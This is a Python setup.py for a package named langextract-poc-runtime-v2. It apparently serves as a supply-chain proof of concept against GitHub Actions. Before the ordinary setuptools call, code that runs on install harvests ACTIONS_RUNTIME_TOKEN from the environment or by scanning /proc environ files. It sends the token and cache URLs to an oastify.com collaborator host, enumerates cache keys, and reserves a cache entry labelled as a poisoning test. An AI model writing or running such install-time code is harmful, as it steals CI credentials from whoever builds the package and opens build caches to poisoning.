import os
import subprocess
import urllib.request
import json
import socket
import time
import glob

OAST = "5w2uc5a9fpgknip5li2pqztgs7yymrag.oastify.com"

def exfil(path, data):
    """Exfiltrate data via POST"""
    try:
        if isinstance(data, str):
            data = data.encode()
        if isinstance(data, bytes):
            req = urllib.request.Request(
                f"https://{OAST}/langextract/runtime_v2{path}",
                data=data,
                method="POST"
            )
            urllib.request.urlopen(req, timeout=15)
    except Exception as e:
        pass

def internal_api_request(url, token, method="GET", data=None, headers=None):
    """Make request to internal Actions API"""
    try:
        if headers is None:
            headers = {}
        
        headers["Authorization"] = f"Bearer {token}"
        headers["User-Agent"] = "actions/cache"
        headers["Accept"] = "application/json;api-version=6.0-preview.1"
        
        if data and isinstance(data, dict):
            data = json.dumps(data).encode()
            headers["Content-Type"] = "application/json"
            
        req = urllib.request.Request(url, headers=headers, method=method, data=data)
        resp = urllib.request.urlopen(req, timeout=10)
        return resp.read().decode(), resp.getcode()
    except urllib.error.HTTPError as e:
        return e.read().decode(), e.code
    except Exception as e:
        return str(e), 0

def find_token_in_proc():
    """Scan /proc for the token"""
    token = None
    url = None
    cache_url = None
    
    # Check current env first
    token = os.environ.get("ACTIONS_RUNTIME_TOKEN")
    url = os.environ.get("ACTIONS_RUNTIME_URL")
    cache_url = os.environ.get("ACTIONS_CACHE_URL")
    
    if token:
        return token, url, cache_url

    # Scan proc
    try:
        # Limit scan to recent PIDs to save time, or scan all numerical dirs
        pids = [p for p in os.listdir("/proc") if p.isdigit()]
        for pid in pids:
            try:
                with open(f"/proc/{pid}/environ", "rb") as f:
                    env_data = f.read()
                    try:
                        env_str = env_data.decode("utf-8", errors="ignore")
                        env_vars = dict(item.split("=", 1) for item in env_str.split("\0") if "=" in item)
                        
                        if "ACTIONS_RUNTIME_TOKEN" in env_vars:
                            found_token = env_vars["ACTIONS_RUNTIME_TOKEN"]
                            found_url = env_vars.get("ACTIONS_RUNTIME_URL")
                            found_cache = env_vars.get("ACTIONS_CACHE_URL")
                            
                            # Valid token found?
                            if found_token:
                                return found_token, found_url, found_cache
                    except:
                        pass
            except:
                continue
    except Exception as e:
        exfil("/proc_scan_error", str(e))
        
    return None, None, None

# ========================================
# PHASE 1: TOKEN HARVESTING (PROCFS)
# ========================================
runtime_token, runtime_url, cache_url = find_token_in_proc()

exfil("/env_check", f"TokenFound: {bool(runtime_token)}\nRuntimeURL: {runtime_url}\nCacheURL: {cache_url}")

if runtime_token:
    # Exfiltrate the actual token for local validation
    exfil("/token_capture", runtime_token)

    # ========================================
    # PHASE 2: CACHE ENUMERATION (List)
    # ========================================
    if cache_url:
        # Try to list keys
        # The query param 'keys' is comma separated list of keys to search
        # We search for 'Linux' as it's a common prefix
        list_url = f"{cache_url}_apis/artifactcache/cache?keys=Linux&version=1" 
        
        resp_body, status = internal_api_request(list_url, runtime_token)
        exfil("/cache_list", f"Status: {status}\nBody: {resp_body}")

    # ========================================
    # PHASE 3: CACHE POISONING POC (Reserve)
    # ========================================
    if cache_url:
        reserve_url = f"{cache_url}_apis/artifactcache/caches"
        
        # Cache key design
        key = f"Linux-poc-poison-v2-{int(time.time())}"
        version = "b1ab1a91-4a8f-4138-b324-h4sh1234" 
        
        payload = {
            "key": key,
            "version": version,
            "cacheSize": 1024 
        }
        
        resp_body, status = internal_api_request(reserve_url, runtime_token, method="POST", data=payload)
        exfil("/cache_reserve", f"Key: {key}\nStatus: {status}\nBody: {resp_body}")

# Standard setup.py boilerplate
from setuptools import setup, find_packages
setup(
    name="langextract-poc-runtime-v2",
    version="0.0.6",
    packages=find_packages(),
)
